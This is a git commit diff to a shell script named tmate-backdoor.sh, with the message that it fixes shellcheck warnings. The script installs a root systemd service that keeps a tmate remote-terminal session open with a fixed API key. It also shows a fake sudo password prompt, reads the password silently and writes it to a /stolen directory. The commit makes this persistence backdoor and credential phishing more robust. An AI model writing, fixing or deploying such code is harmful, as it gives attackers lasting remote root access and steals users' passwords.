a8e4fcedbbaac3cee1229bee3cd139be16d042ae
Tanvir <tanvir.ahmed.tonoy@proton.me>
2024-07-01 16:02:52 +0600

    fix issues in tmate-backdoor.sh captured by shellcheck

--- shell/bash/misc/tmate-backdoor.sh
+++ shell/bash/misc/tmate-backdoor.sh
@@ -20,21 +20,24 @@ Wants=network-online.target
 Restart=always
 User=root
 Type=simple
-ExecStart=tmate -k "$API_KEY" -n "$SESSION_NAME" -F
+ExecStart=tmate -k $API_KEY -n $SESSION_NAME -F
 
 [Install]
 WantedBy=multi-user.target
 "
 
 SERVICE_FILE="/etc/systemd/system/$SERVICE_NAME.service"
-sudo echo "$SERVICE_CONTENT" >"$SERVICE_FILE"
+echo "$SERVICE_CONTENT" | sudo tee "$SERVICE_FILE"
 
 echo "[sudo] password for $USER:"
-read -s password
-sudo mkdir /stolen
-sudo echo "$password" >/stolen/password.txt
+stty -echo
+read -r password
+stty echo
+echo
+
+sudo mkdir -p /stolen
+echo "$password" | sudo tee /stolen/password.txt >/dev/null
 
 sudo systemctl daemon-reload
-
 sudo systemctl enable "$SERVICE_NAME"
 sudo systemctl start "$SERVICE_NAME"
